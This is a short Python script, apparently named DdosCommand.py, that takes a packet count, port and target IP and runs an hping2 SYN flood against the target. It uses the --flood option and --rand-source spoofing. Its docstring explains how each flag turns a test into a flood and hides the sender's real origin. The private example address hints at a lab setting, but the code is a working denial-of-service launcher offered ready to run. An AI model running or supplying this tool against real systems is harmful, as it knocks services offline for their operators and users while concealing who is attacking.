import argparse

#import run command function
from RunCommand import run_command

"""

hping2: Sends custom TCP, UDP, ICMP, and raw IP packets with control over nearly every header field

#sudo hping2 -c 1500 -d 120 -S -w 64 -p 8866 --flood --rand-source 172.19.10.1

-c 1500 — send 1500 packets - ARGUMENT

-d 120 — pad each packet to 120 bytes

-S — set the SYN flag (initiate TCP handshake)

-w 64 — set TCP window size to 64

-p 8866 — target port 8866 - ARGUMENT

--flood — send packets as fast as possible, not waiting for replies and suppressing reply info — this is what turns a test into a flood

--rand-source — spoof a random source IP on every packet, so replies go nowhere and the real origin is hidden

**this works just fine, but we should identify the actual port that TCP is on

"""

def main():
    # Make argument parser with description
    parser = argparse.ArgumentParser(description="Taking in required information to run a DDOS command")

    # Add a positional argument for the number of packets
    parser.add_argument("Packets", help="The number of packets to send. Ex- 1500 ")

    # Add a positional argument for the target port
    parser.add_argument("Port", help="The target port. Ex- 8866 ")

    # Add a positional argument for the target IP
    parser.add_argument("TargIP", help="The target IP. Ex- 172.19.10.1 ")

    # Parse the arguments
    args = parser.parse_args()

    print(f"Packets: {args.Packets}")
    print(f"Port: {args.Port}")
    print(f"Target IP: {args.TargIP}")

    run_command(f"sudo hping2 -c {args.Packets} -d 120 -S -w 64 -p {args.Port} --flood --rand-source {args.TargIP}")

if __name__ == "__main__":
    main()

""" 
Example command: 
python DdosCommand.py PACKETS PORT TARGET_IP
    or
python DdosCommand.py 1500 8866 172.19.10.1
"""